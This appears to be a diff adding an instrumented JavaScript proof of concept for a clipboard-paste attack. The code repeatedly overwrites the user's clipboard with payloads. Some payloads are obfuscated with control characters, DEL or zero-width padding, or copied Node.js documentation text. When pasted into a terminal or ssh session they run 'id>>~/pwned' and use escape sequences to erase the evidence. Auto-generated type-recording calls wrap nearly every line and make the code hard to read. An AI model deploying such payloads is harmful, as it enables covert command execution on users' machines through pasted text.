@@ -1,0 +1,157 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+var Inst37 = 0;
+var Inst38 = 0;
+var Inst39 = 0;
+var Inst40 = 0;
+var Inst41 = 0;
+var Inst42 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+
+try { if (Inst0 <= 1000 && typeof (writeClipboardText) != "undefined") {_RecordType("<17,35,2>",(writeClipboardText)); Inst0++; } } catch(e) {}
+async function writeClipboardText(text) {
+try { if (Inst1 <= 1000 && typeof (text) != "undefined") {_RecordType("<36,40,2>",(text)); Inst1++; } } catch(e) {}
+try { if (Inst6 <= 1000 && typeof (error) != "undefined") {_RecordType("<113,118,5>",(error)); Inst6++; } } catch(e) {}
+  try {
+try { if (Inst2 <= 1000 && typeof (navigator.clipboard.writeText) != "undefined") {_RecordType("<64,93,4>",(navigator.clipboard.writeText)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (navigator.clipboard) != "undefined") {_RecordType("<64,83,4>",(navigator.clipboard)); Inst3++; } } catch(e) {}try { if (Inst4 <= 1000 && typeof (navigator) != "undefined") {_RecordType("<64,73,4>",(navigator)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (text) != "undefined") {_RecordType("<94,98,4>",(text)); Inst5++; } } catch(e) {}
+    await navigator.clipboard.writeText(text);
+  } catch (error) {
+try { if (Inst7 <= 1000 && typeof (console.error) != "undefined") {_RecordType("<127,140,6>",(console.error)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (console) != "undefined") {_RecordType("<127,134,6>",(console)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (error.message) != "undefined") {_RecordType("<141,154,6>",(error.message)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (error) != "undefined") {_RecordType("<141,146,6>",(error)); Inst10++; } } catch(e) {}
+    console.error(error.message);
+  }
+}
+try { if (Inst11 <= 1000 && typeof (rep) != "undefined") {_RecordType("<175,178,9>",(rep)); Inst11++; } } catch(e) {}
+function rep(s,n) {
+try { if (Inst12 <= 1000 && typeof (s) != "undefined") {_RecordType("<179,180,9>",(s)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (n) != "undefined") {_RecordType("<181,182,9>",(n)); Inst13++; } } catch(e) {}
+  r = "";
+try { if (Inst14 <= 1000 && typeof (r) != "undefined") {_RecordType("<189,190,10>",(r)); Inst14++; } } catch(e) {}
+try { if (Inst20 <= 1000 && typeof (s) != "undefined") {_RecordType("<219,220,11>",(s)); Inst20++; } } catch(e) {}
+  for(i=0;i<n;i++)r+=s;
+try { if (Inst15 <= 1000 && typeof (i) != "undefined") {_RecordType("<204,205,11>",(i)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (i) != "undefined") {_RecordType("<208,209,11>",(i)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (n) != "undefined") {_RecordType("<210,211,11>",(n)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (i) != "undefined") {_RecordType("<212,213,11>",(i)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (r) != "undefined") {_RecordType("<216,217,11>",(r)); Inst19++; } } catch(e) {}
+try { if (Inst21 <= 1000 && typeof (r) != "undefined") {_RecordType("<232,233,12>",(r)); Inst21++; } } catch(e) {}
+  return r;
+}
+
+payload_shell_obf='\x1a\x1a\x1a\x05\x15\x05n\x01i\x05t\x01r\x05f\x01p\x05 \x01;\x05"\x01d\x05\\\x01e\x05\\\x01n\x05e\x01w\x05[\x01p\x05A\x01/\x05\\\x01~\x05\\\x01>\x05e\x01>\x05[\x01d\x05K\x01i\x05"\x01\n\x19'
+try { if (Inst22 <= 1000 && typeof (payload_shell_obf) != "undefined") {_RecordType("<241,258,15>",(payload_shell_obf)); Inst22++; } } catch(e) {}
+// non obfuscated version:
+payload_shell='\x1a\x1a\x1a\x05\x15 id>>~/pwned;printf "\\e[A\\e[K"\n\x19'
+try { if (Inst23 <= 1000 && typeof (payload_shell) != "undefined") {_RecordType("<480,493,17>",(payload_shell)); Inst23++; } } catch(e) {}
+try { if (Inst25 <= 1000 && typeof (rep) != "undefined") {_RecordType("<578,581,18>",(rep)); Inst25++; } } catch(e) {}
+payload_ssh='\n~\x1a'+rep("\x7f",5000)+'id>>~/pwned;printf "\\033[6A\\033[J"\nsetsid printf "\\033[2A\\033[J";fg\n'
+try { if (Inst24 <= 1000 && typeof (payload_ssh) != "undefined") {_RecordType("<556,567,18>",(payload_ssh)); Inst24++; } } catch(e) {}
+try { if (Inst27 <= 1000 && typeof (rep) != "undefined") {_RecordType("<697,700,19>",(rep)); Inst27++; } } catch(e) {}
+payload_ssh_nocc='\n~.'+rep("\u200b",5000)+';id>>~/pwned;printf "\\033[3A\\033[J"\n'
+try { if (Inst26 <= 1000 && typeof (payload_ssh_nocc) != "undefined") {_RecordType("<673,689,19>",(payload_ssh_nocc)); Inst26++; } } catch(e) {}
+payload_ssh_nocc_obf='Node.js is an open-source and cross-platform JavaScript runtime environment. It is a popular tool for almost any kind of project.  Node.js runs the V8 JavaScript engine,\n~.Discover JavaScript Timers setTimeout  When writing JavaScript code, you might want to delay the execution of a function.  This is the job of setTimeout. You specify a callback function to execute later, and a value expressing how later you want it to run, in milliseconds:  setTimeout =>    // runs after 2 seconds , 2000  setTimeout =>    // runs after 50 milliseconds , 50  JavaScript Copy to clipboard  This syntax defines a new function. You can call whatever other function you want in there, or you can pass an existing function name, and a set of parameters:  const myFunction = firstParam, secondParam =>    // do something   // runs after 2 seconds setTimeout myFunction, 2000, firstParam, secondParam  JavaScript Copy to clipboard  setTimeout returns the timer id. This is generally not used, but you can store this id, and clear it if you want to delete this scheduled function execution:  const id = setTimeout =>    // should run after 2 seconds , 2000  // I changed my mind clearTimeout id  JavaScript Copy to clipboard Zero delay  If you specify the timeout delay to 0, the callback function will be executed as soon as possible, but after the current function execution:  setTimeout =>   console.log after , 0  console.log before   JavaScript Copy to clipboard  This code will print  before after  Bash Copy to clipboard  This is especially useful to avoid blocking the CPU on intensive tasks and let other functions be executed while performing a heavy calculation, by queuing functions in the scheduler.      Some browsers IE and Edge implement a setImmediate method that does this same exact functionality, but its not standard and unavailable on other browsers. But its a standard function in Node.js.  setInterval  setInterval is a function similar to setTimeout, with a difference: instead of running the callback function once, it will run it forever, at the specific time interval you specify in milliseconds:  setInterval =>   // runs every 2 seconds , 2000  JavaScript Copy to clipboard  The function above runs every 2 seconds unless you tell it to stop, using clearInterval, passing it the interval id that setInterval returned:  const id = setInterval =>   // runs every 2 seconds , 2000  clearInterval id  JavaScript Copy to clipboard  Its common to call clearInterval inside the setInterval callback function, to let it auto-determine if it should run again or stop. For example this code runs something unless App.somethingIWait has the value arrived:  const interval = setInterval =>    if App.somethingIWait === arrived     clearInterval interval   // otherwise do things , 100  JavaScript Copy to clipboard Recursive setTimeout  setInterval starts a function every n milliseconds, without any consideration about when a function finished its execution.  If a function always takes the same amount of time, its all fine:  setInterval working fine  Maybe the function takes different execution times, depending on network conditions for example:  setInterval varying duration  And maybe one long execution overlaps the next one:  setInterval overlapping  To avoid this, you can schedule a recursive setTimeout to be called when the callback function finishes:  const myFunction =  =>    // do something    setTimeout myFunction, 1000   setTimeout myFunction, 1000  JavaScript Copy to clipboard  to achieve this scenario:  Recursive setTimeout  setTimeout and setInterval are available in Node.js, through the Timers module.  Node.js also provides setImmediate, which is equivalent to using setTimeout => , 0, mostly used to work with the Node.js Event Loop.  Introduction to Node.js  Node.js is an open-source and cross-platform JavaScript runtime environment. It is a popular tool for almost any kind of project!  Node.js runs the V8 JavaScript engine, the core of Google Chrome, outside of the browser. This allows Node.js to be very performant.  A Node.js app runs in a single process, without creating a new thread for every request. Node.js provides a set of asynchronous I/O primitives in its standard library that prevent JavaScript code from blocking and generally, libraries in Node.js are written using non-blocking paradigms, making blocking behavior the exception rather than the norm.  When Node.js performs an I/O operation, like reading from the network, accessing a database or the filesystem, instead of blocking the thread and wasting CPU cycles waiting, Node.js will resume the operations when the response comes back.  This allows Node.js to handle thousands of concurrent connections with a single server without introducing the burden of managing thread concurrency, which could be a significant source of bugs.  Node.js has a unique advantage because millions of frontend developers that write JavaScript for the browser are now able to write the server-side code in addition to the client-side code without the need to learn a completely different language.  In Node.js the new ECMAScript standards can be used without problems, as you dont have to wait for all your users to update their browsers - you are in charge of deciding which ECMAScript version to use by changing the Node.js version, and you can also enable specific experimental features by running Node.js with flags. An Example Node.js Application  The most common example Hello World of Node.js is a web server:  const  createServer  = require node:http  const hostname = 127.0.0.1 const port = 3000  const server = createServer req, res =>    res.statusCode = 200   res.setHeader Content-Type, text/plain   res.end Hello World  server.listen port, hostname, =>   console.log Server running at http://$hostname:$port/  JavaScript Copy to clipboard  To run this snippet, save it as a server.js file and run node server.js in your terminal.  This code first includes the Node.js http module.  Node.js has a fantastic standard library, including first-class support for networking.  The createServer method of http creates a new HTTP server and returns it.  The server is set to listen on the specified port and host name. When the server is ready, the callback function is called, in this case informing us that the server is running.  Whenever a new request is received, the request event is called, providing two objects: a request an http.IncomingMessage object and a response an http.ServerResponse object.  Those 2 objects are essential to handle the HTTP call.  The first provides the request details. In this simple example, this is not used, but you could access the request headers and request data.  The second is used to return data to the caller.  In this case with:  res.statusCode = 200  JavaScript Copy to clipboard  we set the statusCode property to 200, to indicate a successful response.  We set the Content-Type header:  res.setHeader Content-Type, text/plain  JavaScript Copy to clipboard  and we close the response, adding the content as an argument to end:  res.end Hello World\n  JavaScript Copy to clipboard NextHow to install Node.js ;id>>~/pwned;printf "\\033[14A\\033[J"\n have to wait for all your users to update their browsers - you are in charge of deciding which ECMAScript version to use by changing the Node.js version, and you can also enable specific experimental features by running Node.js with flags. An Example Node.js Application '
+try { if (Inst28 <= 1000 && typeof (payload_ssh_nocc_obf) != "undefined") {_RecordType("<759,779,20>",(payload_ssh_nocc_obf)); Inst28++; } } catch(e) {}
+//something more like this is needed for cat > /tmp/123 because it eats some of the input
+//payload_proc='\x1a'+rep('\x7f',50000)+' id>>~/pwned;printf "\\e[A\\e[K"\n setsid sh -c \'sleep 0.001; printf "\\e[6T\\e[J"\';fg\n'
+payload_proc='\x1a id>>~/pwned;printf "\\e[A\\e[K"\n setsid sh -c \'sleep 0.001; printf "\\e[6T\\e[J"\';fg\n'
+try { if (Inst29 <= 1000 && typeof (payload_proc) != "undefined") {_RecordType("<8474,8486,23>",(payload_proc)); Inst29++; } } catch(e) {}
+
+// choose one of the above payloads here
+try { if (Inst31 <= 1000 && typeof (payload_shell_obf) != "undefined") {_RecordType("<8637,8654,26>",(payload_shell_obf)); Inst31++; } } catch(e) {}
+payload=payload_shell_obf
+try { if (Inst30 <= 1000 && typeof (payload) != "undefined") {_RecordType("<8629,8636,26>",(payload)); Inst30++; } } catch(e) {}
+
+
+
+try { if (Inst32 <= 1000 && typeof (fff) != "undefined") {_RecordType("<8671,8674,30>",(fff)); Inst32++; } } catch(e) {}
+function fff() {
+try { if (Inst33 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<8682,8692,31>",(setTimeout)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (x) != "undefined") {_RecordType("<8693,8694,31>",(x)); Inst34++; } } catch(e) {}
+  setTimeout(x => {
+try { if (Inst35 <= 1000 && typeof (writeClipboardText(payload).then) != "undefined") {_RecordType("<8705,8737,32>",(writeClipboardText(payload).then)); Inst35++; } } catch(e) {}try { if (Inst36 <= 1000 && typeof (writeClipboardText) != "undefined") {_RecordType("<8705,8723,32>",(writeClipboardText)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (payload) != "undefined") {_RecordType("<8724,8731,32>",(payload)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (x) != "undefined") {_RecordType("<8738,8739,32>",(x)); Inst38++; } } catch(e) {}
+    writeClipboardText(payload).then(x => {});
+try { if (Inst39 <= 1000 && typeof (fff) != "undefined") {_RecordType("<8753,8756,33>",(fff)); Inst39++; } } catch(e) {}
+    fff();
+  }, 1000);
+}
+try { if (Inst40 <= 1000 && typeof (setTimeout) != "undefined") {_RecordType("<8777,8787,36>",(setTimeout)); Inst40++; } } catch(e) {}try { if (Inst41 <= 1000 && typeof (x) != "undefined") {_RecordType("<8788,8789,36>",(x)); Inst41++; } } catch(e) {}try { if (Inst42 <= 1000 && typeof (fff) != "undefined") {_RecordType("<8793,8796,36>",(fff)); Inst42++; } } catch(e) {}
+setTimeout(x => fff(), 100);
+
